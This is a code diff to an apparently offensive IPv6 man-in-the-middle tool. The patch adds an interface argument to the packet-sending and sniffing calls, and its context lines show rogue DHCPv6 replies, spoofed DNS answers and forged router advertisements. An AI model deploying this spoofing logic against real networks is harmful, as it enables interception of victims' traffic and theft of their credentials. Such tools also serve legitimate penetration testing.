@@ -136,7 +136,7 @@ def send_dhcp_advertise(p, basep, target):
         config.ipv6noaddrc += 1
     opt = DHCP6OptIAAddress(preflft=300, validlft=300, addr=addr)
     resp /= DHCP6OptIA_NA(ianaopts=[opt], T1=200, T2=250, iaid=p[DHCP6OptIA_NA].iaid)
-    sendp(resp, verbose=False)
+    sendp(resp, iface=config.default_if, verbose=False)
 
 def send_dhcp_reply(p, basep):
     resp = Ether(dst=basep.src)/IPv6(src=config.selfaddr, dst=basep[IPv6].src)/UDP(sport=547, dport=546) #base packet
@@ -150,7 +150,7 @@ def send_dhcp_reply(p, basep):
     try:
         opt = p[DHCP6OptIAAddress]
         resp /= DHCP6OptIA_NA(ianaopts=[opt], T1=200, T2=250, iaid=p[DHCP6OptIA_NA].iaid)
-        sendp(resp, verbose=False)
+        sendp(resp, iface=config.default_if, verbose=False)
     except IndexError:
         # Some hosts don't send back this layer for some reason, ignore those
         if config.debug or config.verbose:
@@ -191,7 +191,7 @@ def send_dns_reply(p):
     if should_spoof_dns(reqname):
         resp /= DNS(id=dns.id, qr=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, ttl=100, rdata=rdata, type=dns.qd.qtype))
         try:
-            sendp(resp, verbose=False)
+            sendp(resp, iface=config.default_if, verbose=False)
         except socket.error as e:
             print('Error sending spoofed DNS')
             print(e)
@@ -289,7 +289,7 @@ def setupFakeDns():
 def send_ra():
     # Send a Router Advertisement with the "managed" and "other" flag set, which should cause clients to use DHCPv6 and ask us for addresses
     p = Ether(dst='33:33:00:00:00:01')/IPv6(dst='ff02::1')/ICMPv6ND_RA(M=1, O=1)
-    sendp(p, verbose=False)
+    sendp(p, iface=config.default_if, verbose=False)
 
 # Whether packet capturing should stop
 def should_stop(_):
@@ -349,7 +349,7 @@ def main():
         print('Hostname blacklist: %s' % ', '.join(config.host_blacklist))
 
     #Main packet capture thread
-    d = threads.deferToThread(sniff, filter="ip6 proto \\udp or arp or udp port 53", prn=lambda x: reactor.callFromThread(parsepacket, x), stop_filter=should_stop)
+    d = threads.deferToThread(sniff, iface=config.default_if, filter="ip6 proto \\udp or arp or udp port 53", prn=lambda x: reactor.callFromThread(parsepacket, x), stop_filter=should_stop)
     d.addErrback(print_err)
 
     #RA loop
